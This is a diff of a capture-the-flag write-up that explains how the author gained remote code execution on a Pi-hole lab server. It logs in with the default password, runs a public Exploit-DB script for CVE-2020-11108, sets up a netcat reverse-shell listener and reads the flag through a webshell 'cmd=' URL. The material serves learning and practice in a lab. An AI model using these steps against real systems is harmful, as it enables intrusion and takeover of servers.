@@ -49,7 +49,7 @@ Rules:
 - Closing a challenge reduces points.
 - Taking hints reduces points.
 
-The challenges were access by remote kali virtual machines.
+The challenges were accessed by using remote kali virtual machines.
 
 - [Kali In The Browser (Guacamole)](https://www.kali.org/docs/general-use/guacamole-kali-in-browser/){: .image-process-crisp}
 
@@ -95,9 +95,78 @@ To be exact, pinging the IP addresses works, but names do not resolve.
 QUESTION
 Investigate your DNS server Pi-hole
 and find a way to read the log file at /var/log/dnserror.log
-Pi-Hole: <http://env263.target03/admin>
-Password: admin
+Pi-Hole: http://env263.target03/admin
 ```
+
+The first thing that I tried when visiting the login page
+was the password "admin" and the guess was correct.
+
+On the landing page, I checked what version of Pi-hole
+was installed.
+
+![Pi-Hole landing page with version highlighted](../../images/pi-hole-version.png){: .image-process-crisp}
+
+The next obvious thing was to check if any vulnerability is present on that version in Exploit DB,
+where this was found: https://www.exploit-db.com/exploits/48519
+
+An authenticated RCE, perfect!
+
+```bash
+root@env263.kali05:/home/gt/its-always-dns# python3 48519.py 
+[!] No arguments found: python3 CVE-2020-11108.py <dstIP> <srcIP> <PWD>
+    Example: ./CVE-2020-11108.py 192.168.50.130 192.168.50.1 6DS4QtW5
+    But for now, I will ask questions
+[?] Please enter the IP address for Pi-Hole ([env263.target03]): 
+[?] Please enter the your (reachable) IP address to launch listeners ([10.85.26.3]): 
+[?] Please enter the password for Pi-Hole ([admin]): 
+[+] Vulnerable URL is http://env263.target03/admin
+[+] Creation success, ID is 6!
+[!] Binding to 10.85.26.3:80
+[+] Yes, we have an incoming connection from 10.93.26.3
+[!] Closing Listener
+[+] Update succeeded.
+[+] This system is vulnerable!
+Want to continue with exploitation? (Or just run cleanup)? [y/N]: y
+Want root access? (Breaks the application!!) [y/N]: 
+Ok, make sure to have a netcat listener on "10.85.26.3:9001" ("nc -lnvp 9001") and press enter to continue...
+[!] Binding to 10.85.26.3:80
+[+] Yes, we have an incoming connection from 10.93.26.3
+[!] Closing Listener
+[+] Update succeeded.
+[+] Calling http://env263.target03/admin/scripts/pi-hole/php/aotagnto.php
+[+] Calling exploit succeeded.
+    
+[+] Cleaning up now.
+[+] Remove success
+[+] All done, press enter to exit
+```
+
+Ok, cool. Where's the shell? Turns out it was a dud.
+
+Multiple attempts were made, but non-succeeded, but 
+luckly after trying a custom payload to test the exploit, it was a success!
+
+![Modified part of the RCE code](../../images/auth-rce-new-payload.png){: .image-process-crisp}
+
+Exploit confirmed.
+
+![RCE exploit confirmed](../../images/auth-rce-exploit-confirmed.png){: .image-process-crisp}
+
+So where did I check it? It was here:
+
+![Exploit location found](../../images/exploit-here.png){: .image-process-crisp}
+
+Replacing the payload with a simple webshell
+
+![New webshell payload](../../images/auth-rce-webshell-payload.png){: .image-process-crisp}
+
+Exploit code output:
+
+![New payload output](../../images/auth-rce-exploit-code-output.png){: .image-process-crisp}
+
+And the flag was found by following this link: http://env263.target03/admin/scripts/pi-hole/php/fun.php?cmd=cat%20/var/log/dnserror.log
+
+![Found flag](../../images/always-dns-flag.png){: .image-process-crisp}
 
 #### COOL VIDEO
 
